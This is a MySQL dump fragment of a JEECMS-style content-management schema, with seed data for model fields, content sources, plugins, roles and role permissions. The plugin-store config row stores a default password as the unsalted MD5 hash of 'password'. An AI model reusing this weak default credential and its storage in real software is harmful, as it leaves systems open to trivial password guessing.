INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (412,1,'allowShare','分享',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (413,1,'allowScore','评分',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (414,1,'pictures','图片集',12,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (416,1,'tplMobileChannel','栏目手机模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (417,1,'tplMobileContent','指定手机模板',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (418,2,'tplMobileChannel','栏目手机模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (419,2,'channelStatic','栏目静态化',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (420,2,'contentStatic','内容静态化',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (421,4,'tplMobileChannel','栏目手机模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (422,4,'channelStatic','栏目静态化',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (423,4,'contentStatic','内容静态化',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (424,4,'tplMobileContent','指定手机模板',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (425,5,'tplMobileChannel','栏目手机模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (426,6,'tplMobileChannel','栏目手机模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (431,8,'tplMobileChannel','栏目手机模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (432,8,'tplMobileContent','指定手机模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (438,1,'charge','是否收费',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (442,4,'size','大小',10,'','','','','','','',1,0,0,1,1,0,100,100);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (443,4,'edition','版本',10,'','','','','','','',1,0,0,1,1,0,100,100);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (444,4,'system','支持系统',10,'','','','','','','',1,0,0,1,1,0,100,100);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (445,4,'bit','位数',10,'','','','','','','',1,0,0,1,1,0,100,100);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (456,4,'charge','是否收费',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (457,4,'typeImg','类型图',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);

#
# Source for table jc_origin
#

CREATE TABLE `jc_origin` (
  `origin_id` int(11) NOT NULL AUTO_INCREMENT,
  `origin_name` varchar(255) NOT NULL COMMENT '来源名称',
  `ref_count` int(11) NOT NULL DEFAULT '0' COMMENT '来源文章总数',
  PRIMARY KEY (`origin_id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 COMMENT='来源';

#
# Dumping data for table jc_origin
#

INSERT INTO `jc_origin` (`origin_id`,`origin_name`,`ref_count`) VALUES (1,'新浪微博',0);
INSERT INTO `jc_origin` (`origin_id`,`origin_name`,`ref_count`) VALUES (2,'百度',0);
INSERT INTO `jc_origin` (`origin_id`,`origin_name`,`ref_count`) VALUES (3,'百度论坛',0);
INSERT INTO `jc_origin` (`origin_id`,`origin_name`,`ref_count`) VALUES (4,'百度贴吧',0);
INSERT INTO `jc_origin` (`origin_id`,`origin_name`,`ref_count`) VALUES (5,'新浪新闻',0);
INSERT INTO `jc_origin` (`origin_id`,`origin_name`,`ref_count`) VALUES (6,'腾讯新闻',0);

#
# Source for table jc_oss
#

CREATE TABLE `jc_oss` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `app_id` varchar(255) DEFAULT '' COMMENT 'id',
  `secret_id` varchar(255) NOT NULL DEFAULT '' COMMENT 'secret_id',
  `app_key` varchar(255) NOT NULL DEFAULT '' COMMENT 'secret key',
  `bucket_name` varchar(255) DEFAULT NULL COMMENT 'bucket名',
  `bucket_area` varchar(255) DEFAULT '' COMMENT '地区码',
  `oss_type` tinyint(2) NOT NULL DEFAULT '1' COMMENT '存储类型(1腾讯云cos  2阿里云oss  3七牛云)',
  `end_point` varchar(255) NOT NULL DEFAULT '' COMMENT 'end_point',
  `access_domain` varchar(255) NOT NULL DEFAULT '' COMMENT '访问域名',
  `oss_name` varchar(255) NOT NULL DEFAULT '' COMMENT '名称',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='oss云存储配置';

#
# Dumping data for table jc_oss
#


#
# Source for table jc_plug
#

CREATE TABLE `jc_plug` (
  `plug_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT '插件名称',
  `path` varchar(255) NOT NULL DEFAULT '' COMMENT '文件路径',
  `description` varchar(2000) DEFAULT NULL COMMENT '描述',
  `author` varchar(255) DEFAULT NULL COMMENT '作者',
  `upload_time` datetime NOT NULL COMMENT '上传时间',
  `install_time` datetime DEFAULT NULL COMMENT '安装时间',
  `uninstall_time` datetime DEFAULT NULL COMMENT '卸载时间',
  `file_conflict` tinyint(1) NOT NULL DEFAULT '0' COMMENT '包含文件是否冲突',
  `is_used` tinyint(1) NOT NULL DEFAULT '0' COMMENT '使用状态(0未使用,1使用中)',
  `plug_perms` varchar(255) DEFAULT '' COMMENT '插件权限（,分隔各个权限配置）',
  `plug_repair` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否修复类插件(0 新功能插件 1修复类)',
  PRIMARY KEY (`plug_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='插件';

#
# Dumping data for table jc_plug
#

INSERT INTO `jc_plug` (`plug_id`,`name`,`path`,`description`,`author`,`upload_time`,`install_time`,`uninstall_time`,`file_conflict`,`is_used`,`plug_perms`,`plug_repair`) VALUES (1,'应用中心','/WEB-INF/plug/plugStore.zip','应用中心','jeecms','2016-09-08 09:05:12','2016-10-08 16:12:57','2016-10-08 16:12:39',0,1,'plugStore.center@store:center;storeConfig.edit@storeConfig:v_edit;storeConfig.update@storeConfig:o_update;',0);

#
# Source for table jc_plug_store_config
#

CREATE TABLE `jc_plug_store_config` (
  `config_id` int(11) NOT NULL DEFAULT '1',
  `server_url` varchar(255) NOT NULL DEFAULT '' COMMENT '接口根地址',
  `password` varchar(255) NOT NULL DEFAULT '' COMMENT '应用商店密码',
  PRIMARY KEY (`config_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

#
# Dumping data for table jc_plug_store_config
#

INSERT INTO `jc_plug_store_config` (`config_id`,`server_url`,`password`) VALUES (1,'http://bbs.jeecms.com','5f4dcc3b5aa765d61d8327deb882cf99');

#
# Source for table jc_receiver_message
#

CREATE TABLE `jc_receiver_message` (
  `msg_re_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '消息id',
  `msg_title` varchar(255) NOT NULL DEFAULT '' COMMENT '标题',
  `msg_content` longtext COMMENT '站内信息内容',
  `send_time` timestamp NULL DEFAULT NULL COMMENT '发送时间',
  `msg_send_user` int(11) NOT NULL DEFAULT '1' COMMENT '发信息人',
  `msg_receiver_user` int(11) NOT NULL DEFAULT '0' COMMENT '接收人',
  `site_id` int(11) NOT NULL DEFAULT '1' COMMENT '站点',
  `msg_status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '消息状态0未读，1已读',
  `msg_box` int(2) NOT NULL DEFAULT '1' COMMENT '消息信箱 0收件箱 1发件箱 2草稿箱 3垃圾箱',
  `msg_id` int(11) DEFAULT NULL COMMENT '发信的信件id',
  PRIMARY KEY (`msg_re_id`),
  KEY `jc_receiver_message_user_send` (`msg_send_user`),
  KEY `jc_receiver_message_user_receiver` (`msg_receiver_user`),
  KEY `jc_receiver_message_site` (`site_id`),
  KEY `jc_receiver_message_message` (`msg_re_id`),
  KEY `fk_jc_receiver_message_message` (`msg_id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COMMENT='站内信收信表';

#
# Dumping data for table jc_receiver_message
#

INSERT INTO `jc_receiver_message` (`msg_re_id`,`msg_title`,`msg_content`,`send_time`,`msg_send_user`,`msg_receiver_user`,`site_id`,`msg_status`,`msg_box`,`msg_id`) VALUES (2,'1111','1111','2016-10-11 17:43:42',1,1,1,0,3,NULL);
INSERT INTO `jc_receiver_message` (`msg_re_id`,`msg_title`,`msg_content`,`send_time`,`msg_send_user`,`msg_receiver_user`,`site_id`,`msg_status`,`msg_box`,`msg_id`) VALUES (4,'qqw','qwwqwww','2016-10-12 09:51:10',1,1,1,0,3,NULL);

#
# Source for table jc_role
#

CREATE TABLE `jc_role` (
  `role_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) DEFAULT NULL,
  `role_name` varchar(100) NOT NULL COMMENT '角色名称',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `is_super` char(1) NOT NULL DEFAULT '0' COMMENT '拥有所有权限',
  `role_level` int(11) NOT NULL DEFAULT '10' COMMENT '角色等级',
  PRIMARY KEY (`role_id`),
  KEY `fk_jc_role_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='CMS角色表';

#
# Dumping data for table jc_role
#

INSERT INTO `jc_role` (`role_id`,`site_id`,`role_name`,`priority`,`is_super`,`role_level`) VALUES (1,NULL,'管理员',10,'1',10);
INSERT INTO `jc_role` (`role_id`,`site_id`,`role_name`,`priority`,`is_super`,`role_level`) VALUES (2,NULL,'测试 ',10,'0',10);

#
# Source for table jc_role_permission
#

CREATE TABLE `jc_role_permission` (
  `role_id` int(11) NOT NULL,
  `uri` varchar(100) NOT NULL,
  KEY `fk_jc_permission_role` (`role_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS角色授权表';

#
# Dumping data for table jc_role_permission
#

INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'topic:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'accountPay:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_view');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'config:v_content_charge');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'channel:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content_cycle:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'department:depart_main');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'admin_local:v_channels_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'log:o_delete_login_success');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'data:o_rename');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'admin_global:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'role:v_tree');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'weixinMessage:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'scoregroup:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'dictionary:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'guestbook_ctg:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'template:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'type:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'admin_local:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'task:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'frame:user_right');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'group:v_channels_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'task:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'resource:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'friendlink:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:o_check_share');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'flow:pv:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'acquisition:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'dictionary:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_send_to_weixin');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'log:v_list_login_success');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:share_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'admin_global:v_depart_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'member:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'account:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'group:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'left');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'advertising:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_tree_share');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_tree_radio');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'acquisition:v_history');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'webservice:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'webserviceAuth:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'config:v_login');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'topic:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'contentBuy:user_order_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'message:v_read');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'statistic:comment:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'log:o_delete_operating_batch');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'lucene:o_create');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_tree_channels');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_send_to_topic');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'group:v_channels_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'template:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'directive:module');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'guestbook:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'contentBuy:commissionStatic');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'data:v_revert');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'weixinMenu:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'file:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'directive:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'ftp:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'accountPay:draw_apply_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'channel:v_create_path');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'workflow:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'right');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'department:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'frame:user_main');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'advertising:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'scoreitem:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'guestbook_ctg:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'workloadstatistic:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'config:register_item_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'store:center');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'admin_global:v_site_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'static:o_index');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_check');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'scoregroup:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'statistic:channel:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'message:v_findUser');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'weixinMessage:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_delete');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'config:register_item_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'admin_global:v_check_username');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'role:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'resource:v_left');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'resource:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'advertising_space:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'origin:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'admin_local:v_check_username');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'frame:maintain_left');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'item:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'vote_topic:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'frame:statistic_left');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'frame:content_main');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'keyword:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'template:o_def_template');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'static:o_content');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_unpigeonhole');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'tag:v_check_tag');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'flow:area:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'advertising_space:v_ajax_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'config:o_login');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'guestbook_ctg:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'admin_local:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'weixinMessage:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'department:v_site_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'static:o_channel');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_share');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'template:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_left');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_reject');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'comment:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'template:v_left');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'site:v_checkMaster');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'resource:resource_main');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'config:v_mark_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'guestbook_ctg:v_ajax_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'message:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'statistic:guestbook:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'group:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'workflow:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'config:register_item_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'admin_local:v_channels_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'admin_local:v_check_email');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'personal:v_checkPwd');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'tag:v_ajax_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'model:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'site:site_main');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'workflow:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'webserviceCallRecord:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'topic:o_priority');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'config:v_attr_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'site_config:v_company_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'department:v_left');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'department:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'frame:maintain_main');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'advertising:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'tag:v_add');
